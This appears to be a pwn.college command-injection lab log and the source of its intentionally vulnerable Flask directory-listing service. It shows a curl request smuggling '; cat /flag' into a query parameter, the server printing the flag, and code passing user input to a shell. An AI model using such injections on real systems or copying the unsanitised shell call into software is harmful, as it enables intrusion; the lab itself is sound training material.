@@ -1,0 +1,77 @@
+hacker@web-security~cmdi-1:/challenge$ curl "http://challenge.localhost:80/problem?location=/;%20cat%20/flag"
+DEBUG: command='ls -l /; cat /flag'
+127.0.0.1 - - [19/Oct/2025 16:10:14] "GET /problem?location=/;%20cat%20/flag HTTP/1.1" 200 -
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/problem"><input type=text name=location><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l /; cat /flag:</b><br>
+        <pre>total 64
+lrwxrwxrwx    1 root root    7 Apr  4  2025 bin -> usr/bin
+drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
+drwxr-xr-x    1 root root 4096 Oct 19 15:57 challenge
+drwxr-xr-x    6 root root  380 Oct 19 15:57 dev
+drwxr-xr-x    1 root root 4096 Oct 19 15:57 etc
+-r--------    1 root root   58 Oct 19 15:57 flag
+drwxr-xr-x    1 root root 4096 Sep 26 17:24 home
+lrwxrwxrwx    1 root root    7 Apr  4  2025 lib -> usr/lib
+lrwxrwxrwx    1 root root    9 Apr  4  2025 lib32 -> usr/lib32
+lrwxrwxrwx    1 root root    9 Apr  4  2025 lib64 -> usr/lib64
+lrwxrwxrwx    1 root root   10 Apr  4  2025 libx32 -> usr/libx32
+drwxr-xr-x    2 root root 4096 Apr  4  2025 media
+drwxr-xr-x    2 root root 4096 Apr  4  2025 mnt
+drwxr-xr-x    1 root root   16 Oct 26  2024 nix
+drwxr-xr-x    1 root root 4096 Sep 26 17:24 opt
+dr-xr-xr-x 2598 root root    0 Oct 19 15:57 proc
+drwx------    1 root root 4096 Sep 26 17:24 root
+drwxr-xr-x    1 root root 4096 Oct 19 15:57 run
+lrwxrwxrwx    1 root root    8 Apr  4  2025 sbin -> usr/sbin
+drwxr-xr-x    2 root root 4096 Apr  4  2025 srv
+dr-xr-xr-x   13 root root    0 Aug 26 04:26 sys
+drwxrwxrwt    1 root root 4096 Oct 19 15:57 tmp
+drwxr-xr-x    1 root root 4096 Sep 26 17:09 usr
+drwxr-xr-x    1 root root 4096 Sep 26 17:08 var
+pwn.college{ElQe2hcB-ccVqZr6YrwEUypeHnC.dVjN1YDL1AjM5MzW}
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-1:/chacat server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/problem", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("location", "/challenge")
+    command = f"ls -l {arg}"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/problem"><input type=text name=location><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
